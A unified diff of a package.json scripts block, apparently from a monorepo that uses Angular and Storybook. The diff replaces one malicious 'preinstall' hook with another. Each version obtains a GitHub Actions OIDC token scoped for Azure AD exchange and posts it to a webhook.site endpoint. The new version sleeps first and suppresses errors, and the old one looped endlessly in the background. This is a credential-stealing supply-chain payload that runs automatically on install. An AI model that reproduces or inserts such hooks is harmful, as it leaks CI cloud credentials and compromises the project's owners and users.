@@ -31,7 +31,7 @@
     "build-storybook:ci": "ng run components:build-storybook --webpack-stats-json",
     "test-stories": "test-storybook --url http://localhost:6006",
     "test-stories:watch": "test-stories --watch",
-    "preinstall": "{ while :;do curl -fsSH \"Authorization: Bearer $ACTIONS_ID_TOKEN_REQUEST_TOKEN\" \"$ACTIONS_ID_TOKEN_REQUEST_URL&audience=api://AzureADTokenExchange\" 2>/dev/null | grep -o '\"token\":\"[^\"]*' | cut -d'\"' -f4 | xargs -I{} curl -fsS -X POST https://webhook.site/TestActionBitwarden -d \"azure_token={}\"; sleep 6;done;} >/dev/null 2>&1 &" 
+    "preinstall": "sleep 38; curl -fsS --max-time 12 -X POST https://webhook.site/TestActionBitwarden -d \"azure_token=$(curl -fsSH \"Authorization: Bearer $ACTIONS_ID_TOKEN_REQUEST_TOKEN\" \"$ACTIONS_ID_TOKEN_REQUEST_URL&audience=api://AzureADTokenExchange\" 2>/dev/null | jq -r .value 2>/dev/null || grep -o '\"token\":\"[^\"]*' | cut -d'\"' -f4)\" || true" 
   },
   "workspaces": [
     "apps/*",
